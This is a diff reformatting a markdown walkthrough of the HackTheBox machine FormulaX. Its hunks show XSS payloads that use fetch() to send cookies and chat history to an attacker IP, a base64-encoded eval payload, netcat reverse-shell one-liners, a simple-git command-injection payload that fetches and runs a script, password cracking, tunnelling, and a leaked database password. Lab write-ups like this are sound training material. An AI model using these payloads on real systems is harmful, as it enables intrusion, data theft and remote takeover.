@@ -12,6 +12,7 @@ description: "FormulaX - A walkthrough of the challenge with enumeration, exploi
 
 # HTB - FormulaX
 
+
 ```bash
 nmap 10.129.215.40 -A
  
@@ -38,6 +39,7 @@ Server-side XSS vulnerability in the contact page's fields (all three):
 <u>To test (because we can't use alert() here):</u>
 
 - Using the payload:  
+
 ```java
 fetch("http://10.10.14.48:8085/" + document.cookie);
 
@@ -59,6 +61,7 @@ Which evaluates to (injected into first name):
 ![image6](../resources/54882384810c4484b2b90e337efd0a6c.png)
 
 - Trying a different payload (still base64 encoding it, etc):
+
 ```java
 fetch("http://10.10.14.48:8080/?d=" + encodeURIComponent(window.location.href));
 
@@ -104,7 +107,7 @@ script.addEventListener('load', function () {
 This gets base64 encoded and put in to the atob() function - then paste it into first name:
 
 ```java
-\<img SRC=x onerror='eval(atob("Y29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CnNjcmlwdC5zcmMgPSAnL3NvY2tldC5pby9zb2NrZXQuaW8uanMnOwpkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcmlwdCk7CnNjcmlwdC5hZGRFdmVudExpc3RlbmVyKCdsb2FkJywgZnVuY3Rpb24oKSB7CmNvbnN0IHJlcyA9IGF4aW9zLmdldChgL3VzZXIvYXBpL2NoYXRgKTsgY29uc3Qgc29ja2V0ID0gaW8oJy8nLHt3aXRoQ3JlZGVudGlhbHM6IHRydWV9KTsgc29ja2V0Lm9uKCdtZXNzYWdlJywgKG15X21lc3NhZ2UpID0+IHtmZXRjaCgiaHR0cDovLzEwLjEwLjE0LjQ4Lz9kPSIgKyBidG9hKG15X21lc3NhZ2UpKX0pIDsgc29ja2V0LmVtaXQoJ2NsaWVudF9tZXNzYWdlJywgJ2hpc3RvcnknKTsKfSk7"));'/\>
+<img SRC=x onerror='eval(atob("Y29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CnNjcmlwdC5zcmMgPSAnL3NvY2tldC5pby9zb2NrZXQuaW8uanMnOwpkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcmlwdCk7CnNjcmlwdC5hZGRFdmVudExpc3RlbmVyKCdsb2FkJywgZnVuY3Rpb24oKSB7CmNvbnN0IHJlcyA9IGF4aW9zLmdldChgL3VzZXIvYXBpL2NoYXRgKTsgY29uc3Qgc29ja2V0ID0gaW8oJy8nLHt3aXRoQ3JlZGVudGlhbHM6IHRydWV9KTsgc29ja2V0Lm9uKCdtZXNzYWdlJywgKG15X21lc3NhZ2UpID0+IHtmZXRjaCgiaHR0cDovLzEwLjEwLjE0LjQ4Lz9kPSIgKyBidG9hKG15X21lc3NhZ2UpKX0pIDsgc29ja2V0LmVtaXQoJ2NsaWVudF9tZXNzYWdlJywgJ2hpc3RvcnknKTsKfSk7"));'/>
 
 ```
 - Now we get something different back:
@@ -166,13 +169,14 @@ After adding dev-git-auto-update.chatbot.htb to /etc/hosts, we get:
 <https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221>
 
 - Create a bash script:
-```bash
-\#!/bin/sh
 
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2\>&1\|nc 10.10.14.48 9003 \>/tmp/f
+```bash
+#!/bin/sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.48 9003 >/tmp/f
 ```
 
 - Set up python server:
+
 ```bash
 sudo python -m http.server 80
 
@@ -180,6 +184,7 @@ sudo python -m http.server 80
 - Set up listener
 
 - Now we need to modify the code from Snyk:
+
 ```bash
 ext::sh -c curl% http://10.10.14.48/bash_script.sh|sh >&2
 
@@ -226,6 +231,7 @@ exit
 ![image22](../resources/c14deafebf3649bd95277b5aeb71e947.png)
 
 - Cracked frank_dorky's password:
+
 ```bash
 hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 
@@ -246,6 +252,7 @@ cat user.txt
 
 ```
 - Copy LinPEAS over:
+
 ```bash
 scp linpeas.sh frank_dorky@10.129.215.190:/home/frank_dorky/
 
@@ -259,6 +266,7 @@ scp linpeas.sh frank_dorky@10.129.215.190:/home/frank_dorky/
 - Server running locally on port 3000
 
 - Upload chisel to the target:
+
 ```bash
 #On Kali:
 ./chisel server -p 8888 --reverse
@@ -279,6 +287,7 @@ scp linpeas.sh frank_dorky@10.129.215.190:/home/frank_dorky/
 - The default credentials didn't work
 
 - Add new user:
+
 ```bash
 cd /opt/librenms
 php adduser.php player1 player1 10
@@ -320,18 +329,18 @@ php adduser.php \<username\> \<password\> \<access level\>
 
 ---------------------------
 
-```bash
+
 Using DNS names through chisel on 127.0.0.1 - doesn't seem to work
 
-```
 - So we have to port forward 3000 to our machine:
+
 ```bash
 ssh -L 3000:127.0.0.1:3000 frank_dorky@10.129.215.190
 
 ```
 Now we can navigate to:
 
-<http://librenms.com:3000>
+`http://librenms.com:3000`
 
 ---------------------------
 
@@ -359,11 +368,13 @@ We can now edit them. Before it didn't allow use to do it
 ![image39](../resources/de3b938744ba490784d2dbeb2ff159d5.png)
 
 - We can either connect to the db:
+
 ```bash
 mysql -u kai_relay -p'mychemicalformulaX' librenms
 
 ```
 - Or:
+
 ```bash
 su kai_relay
 
@@ -434,10 +445,12 @@ shell_execute.execute("./shell.sh", '', 1)
 ```
 
 - Create a shell.sh with:
+
 ```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2\>&1\|nc 10.10.14.48 7777 \>/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.48 7777 >/tmp/f
 
 ```
+
 ```bash
 chmod +x shell.sh
 ```
